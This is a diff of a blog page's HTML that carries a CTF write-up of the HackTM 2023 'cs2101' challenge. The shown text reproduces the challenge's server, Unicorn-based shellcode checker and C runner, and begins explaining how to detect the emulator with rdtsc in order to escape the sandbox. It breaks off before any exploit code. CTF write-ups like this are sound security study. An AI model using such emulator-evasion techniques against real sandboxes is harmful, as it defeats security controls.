-      <span id="gblog-dark-mode">
-        <svg class="icon gblog_brightness_dark">
-          <title></title>
-          <use xlink:href="#gblog_brightness_dark"></use>
-        </svg>
-        <svg class="icon gblog_brightness_light">
-          <title></title>
-          <use xlink:href="#gblog_brightness_light"></use>
-        </svg>
-        <svg class="icon gblog_brightness_auto">
-          <title></title>
-          <use xlink:href="#gblog_brightness_auto"></use>
-        </svg>
-      </span>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=https://cdn.discordapp.com/attachments/755522926819934349/1135933820852502589/chtholly_nota_seniorious_by_asukaln_dfhx63b-414w-2x.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">nasm </div>
+      <div class="dot"></div>
+      <div class="subtitle">pwn / kernel stuff </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
+         
+      </div>  
     </div>
   </div>
-</header>
-<nav class="gblog-nav">
-  <input type="checkbox" id="menu-control" class="hidden" />
-  <div class="gblog-nav__control">
-    <label for="menu-control" class="flex align-center justify-center">
-      <svg class="icon gblog_menu"><use xlink:href="#gblog_menu"></use></svg>
-      <svg class="icon gblog_clear"><use xlink:href="#gblog_clear"></use></svg>
-      <span>Navigation</span>
-    </label>
-  </div>
-  <ul class="gblog-nav__list container flex flex-wrap justify-center menu-content">
-    
-    
-    
-      
+</div>
 
   
-  
-  
-
-  
+  <div class="sticky">
     
       
-      
-      
-
-      
-        <li>
-          <a
-            href="
-              https://github.com/n4sm
-            "
-            class="gblog-nav__entry "
-          >
-            
-              <svg class="icon gblog_github"><use xlink:href="#gblog_github"></use></svg>
-            
-            Github Profile
-          </a>
-        </li>
-      
-    
-  
-    
-      
-      
-      
-
-      
-        <li>
-          <a
-            href="
-              /posts/about
-            "
-            class="gblog-nav__entry "
-          >
-            
-              <svg class="icon gblog_person"><use xlink:href="#gblog_person"></use></svg>
-            
-            About
-          </a>
-        </li>
-      
-    
-  
 
 
-
-
-
-
-    
-  </ul>
-</nav>
-
-
-
-      <main class="gblog-page container">
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/pwn/">
+                pwn
+                <div class="category-count">19</div>
+            </a>
         
-  <article class="gblog-post">
-    <header class="gblog-post__header">
-      
-      
-
-
-      <h1 class="gblog-post__title">[HackTM finals 2023 - pwn] cs2101</h1>
-
-      
-        <div class="flex flex-wrap align-center gblog-post__meta gblog-post__meta--head">
-          <span class="flex align-center no-wrap">
-  <svg class="icon gblog_date"><use xlink:href="#gblog_date"></use></svg>
-  <span class="gblog-post__tag">
-    <time datetime="2023-05-15T00:00:00Z">
-      
-      May 15, 2023
-    </time>
-  </span>
-</span>
-
-<span class="flex align-center no-wrap">
-  <svg class="icon gblog_timer"><use xlink:href="#gblog_timer"></use></svg>
-  <span class="gblog-post__tag">6 min read</span>
-</span>
-
-
-
-
-
-
-
-
-  
-    
-    
-      
-        <span class="flex align-center no-wrap">
-          <svg class="icon gblog_bookmark"><use xlink:href="#gblog_bookmark"></use></svg>
-          
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/cs2101/"
-      title="All posts tagged with 'cs2101'"
-    >
-      cs2101
-    </a>
-  </span>
-
-        </span>
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/ctf/"
-      title="All posts tagged with 'ctf'"
-    >
-      ctf
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/emulator/"
-      title="All posts tagged with 'emulator'"
-    >
-      emulator
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/hacktm/"
-      title="All posts tagged with 'hacktm'"
-    >
-      hacktm
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/linux/"
-      title="All posts tagged with 'linux'"
-    >
-      linux
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/nasm/"
-      title="All posts tagged with 'nasm'"
-    >
-      nasm
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/pwn/"
-      title="All posts tagged with 'pwn'"
-    >
-      pwn
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/shellcoding/"
-      title="All posts tagged with 'shellcoding'"
-    >
-      shellcoding
-    </a>
-  </span>
-
-      
-    
-    
-  
-    
-    
-      
-        
-  <span class="gblog-post__tag gblog-button gblog-button--regular">
-    <a
-      class="gblog-button__link"
-      href="/tags/unicorn/"
-      title="All posts tagged with 'unicorn'"
-    >
-      unicorn
-    </a>
-  </span>
-
-      
-    
-    
-  
-
-
-
-
-
-
+            <a class="category-link" href="/categories/kernel/">
+                kernel
+                <div class="category-count">3</div>
+            </a>
         </div>
+    </div>
+  </div>
+
+
+    
       
-    </header>
-    <section class="gblog-markdown">
-      <div class="gblog-post__anchorwrap">
-    <h1 id="cs2101">
-        cs2101
-        <a data-clipboard-text="https://nasm.re/posts/cs2101/#cs2101" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor cs2101" href="#cs2101">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h1>
-</div>
-<p><code>cs2101</code> is shellcoding / unicorn sandbox escape challenge I did during the <a
-  class="gblog-markdown__link"
-  href="https://ctfx.hacktm.ro/home"
-  
-  >HackTM finals</a
->.</p>
-<div class="gblog-post__anchorwrap">
-    <h2 id="what-we-have">
-        What we have
-        <a data-clipboard-text="https://nasm.re/posts/cs2101/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<p>The challenge is splitted into three file: the server, the unicorn callback based checker and the final C program that runs the shellcode without any restrictions. Let&rsquo;s take a look at the server:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python3</span>
-
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="kn">import</span> <span class="nn">tempfile</span>
-<span class="kn">from</span> <span class="nn">sc_filter</span> <span class="kn">import</span> <span class="n">emulate</span>
-
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="n">encoded</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter your base64 encoded shellcode:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-    <span class="n">encoded</span><span class="o">+=</span> <span class="s1">&#39;=======&#39;</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Error decoding your base64&#34;</span><span class="p">)</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">emulate</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;I&#39;m not letting you hack me again!&#34;</span><span class="p">)</span>
-        <span class="k">return</span>
-
-    <span class="k">with</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">()</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> 
-        <span class="n">f</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
-
-        <span class="n">name</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">name</span>
-        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;./emulate </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
         
+          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
+            <div class="recent-link-text">
+              [ImaginaryCTF 2023 - pwn] window-of-opportunity
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/posts/mailman/" title="[ImaginaryCTF 2023 - pwn] mailman" >
+            <div class="recent-link-text">
+              [ImaginaryCTF 2023 - pwn] mailman
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
 
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
 
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="n">main</span><span class="p">()</span>
-</code></pre></div><p>The server is asking for a shellcode encoded in base64, then it is checking some behaviours of the shellcode by running it into unicorn through the <code>emulate</code> function and if it does not fail the shellcode is run by the <code>emulate</code> C program. Now let&rsquo;s take a quick look at the unicorn checker:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python3</span>
-
-<span class="kn">from</span> <span class="nn">unicorn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">unicorn.x86_const</span> <span class="kn">import</span> <span class="o">*</span>
-
-
-<span class="c1"># memory address where emulation starts</span>
-<span class="n">ADDRESS</span> <span class="o">=</span> <span class="mh">0x1000000</span>
-
-
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;sc.bin&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="n">code</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-
-    <span class="k">if</span> <span class="n">emulate</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Done emulating. Passed!&#34;</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Done emulating. Failed!&#34;</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">emulate</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="c1"># Initialize emulator in X86-64bit mode</span>
-        <span class="n">mu</span> <span class="o">=</span> <span class="n">Uc</span><span class="p">(</span><span class="n">UC_ARCH_X86</span><span class="p">,</span> <span class="n">UC_MODE_64</span><span class="p">)</span>
-
-        <span class="c1"># map memory</span>
-        <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
-
-        <span class="c1"># shellcode to test</span>
-        <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
-
-        <span class="c1"># initialize machine registers</span>
-        <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_X86_REG_RAX</span><span class="p">,</span> <span class="n">ADDRESS</span><span class="p">)</span>
-        <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_X86_REG_RFLAGS</span><span class="p">,</span> <span class="mh">0x246</span><span class="p">)</span>
-
-        <span class="c1"># initialize hooks</span>
-        <span class="n">allowed</span> <span class="o">=</span> <span class="p">[</span><span class="kc">True</span><span class="p">]</span>
-        <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_INSN</span><span class="p">,</span> <span class="n">syscall_hook</span><span class="p">,</span> <span class="n">allowed</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">UC_X86_INS_SYSCALL</span><span class="p">)</span>
-        <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">code_hook</span><span class="p">,</span> <span class="n">allowed</span><span class="p">)</span>
-
-        <span class="c1"># emulate code in infinite time &amp; unlimited instructions</span>
-        <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="n">ADDRESS</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
-
-        <span class="k">return</span> <span class="n">allowed</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-
-    <span class="k">except</span> <span class="n">UcError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ERROR: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">e</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">syscall_hook</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
-    <span class="c1"># Syscalls are dangerous!</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;not allowed to use syscalls&#34;</span><span class="p">)</span>
-    <span class="n">user_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
-
-
-<span class="k">def</span> <span class="nf">code_hook</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
-    <span class="n">inst</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
-
-    <span class="c1"># CPUID (No easy wins here!)</span>
-    <span class="k">if</span> <span class="n">inst</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x0f\xa2</span><span class="s1">&#39;</span><span class="p">:</span>
-        <span class="n">user_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;CPUID&#34;</span><span class="p">)</span>
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="n">main</span><span class="p">()</span>
-</code></pre></div><p>To succeed the check in the server our shellcode should match several conditions: first there should not be any syscalls / <code>cpuid</code> instructions, then it should exit (and return allowed[0] === true) without triggering an exception not handled by unicorn (for example <code>SIGSEGV</code> or an interrupt not handled like <code>int 0x80</code>. And if it does so the shellcode is ran by this program:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="cp">#define ADDRESS ((void*)0x1000000)
-</span><span class="cp"></span>
-<span class="cm">/* gcc emulate.c -o emulate -masm=intel */</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Usage: %s &lt;filename&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="kt">void</span> <span class="o">*</span><span class="n">code</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
-                      <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span>
-                      <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="n">code</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
-        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
-        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
-    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-
-    <span class="n">__asm__</span> <span class="k">volatile</span> <span class="p">(</span>
-        <span class="s">&#34;lea rcx, [rsp-0x1800]</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;fxrstor [rcx]</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor rbx, rbx</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor rcx, rcx</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor rdx, rdx</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor rdi, rdi</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor rsi, rsi</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor rbp, rbp</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor rsp, rsp</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor r8, r8</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor r9, r9</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor r10, r10</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor r11, r11</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor r12, r12</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor r13, r13</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor r14, r14</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;xor r15, r15</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="s">&#34;jmp rax</span><span class="se">\n\t</span><span class="s">&#34;</span>
-        <span class="o">:</span>
-        <span class="o">:</span> <span class="s">&#34;a&#34;</span> <span class="p">(</span><span class="n">code</span><span class="p">)</span>
-        <span class="o">:</span>
-    <span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>If we succeed to run the shellcode within this program we could easily execute syscalls and then drop a shell.</p>
-<div class="gblog-post__anchorwrap">
-    <h2 id="bypass-the-sandbox">
-        Bypass the sandbox
-        <a data-clipboard-text="https://nasm.re/posts/cs2101/#bypass-the-sandbox" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Bypass the sandbox" href="#bypass-the-sandbox">
-            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
-        </a>
-    </h2>
-</div>
-<p>The first step is to make our shellcode aware of the environment inside which it is running. A classic trick to achieve this is to use the <code>rdtsc</code> instruction (<a
-  class="gblog-markdown__link"
-  href="https://www.felixcloutier.com/x86/rdtsc"
+<article id="post-cs2101" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   
-  >technical spec here</a
->). According to the documentation, it:</p>
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        [HackTM finals 2023 - pwn] cs2101
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2023-05-14T22:00:00.000Z" itemprop="datePublished">2023-05-15</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+    Uncategorized 
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            1.3k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cs2101/" rel="tag">cs2101</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/emulator/" rel="tag">emulator</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hacktm/" rel="tag">hacktm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nasm/" rel="tag">nasm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shellcoding/" rel="tag">shellcoding</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/unicorn/" rel="tag">unicorn</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h1 id="cs2101"><a href="#cs2101" class="headerlink" title="cs2101"></a>cs2101</h1><p><code>cs2101</code> is shellcoding &#x2F; unicorn sandbox escape challenge I did during the <a target="_blank" rel="noopener" href="https://ctfx.hacktm.ro/home">HackTM finals</a>.</p>
+<h2 id="What-we-have"><a href="#What-we-have" class="headerlink" title="What we have"></a>What we have</h2><p>The challenge is splitted into three file: the server, the unicorn callback based checker and the final C program that runs the shellcode without any restrictions. Let’s take a look at the server:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> sc_filter <span class="keyword">import</span> emulate</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    encoded = <span class="built_in">input</span>(<span class="string">&quot;Enter your base64 encoded shellcode:\n&quot;</span>)</span><br><span class="line">    encoded+= <span class="string">&#x27;=======&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        shellcode = base64.b64decode(encoded)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error decoding your base64&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> emulate(shellcode):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;I&#x27;m not letting you hack me again!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tempfile.NamedTemporaryFile() <span class="keyword">as</span> f:</span><br><span class="line">        f.write(shellcode) </span><br><span class="line">        f.flush()</span><br><span class="line"></span><br><span class="line">        name = f.name</span><br><span class="line">        os.system(<span class="string">&quot;./emulate &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>The server is asking for a shellcode encoded in base64, then it is checking some behaviours of the shellcode by running it into unicorn through the <code>emulate</code> function and if it does not fail the shellcode is run by the <code>emulate</code> C program. Now let’s take a quick look at the unicorn checker:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 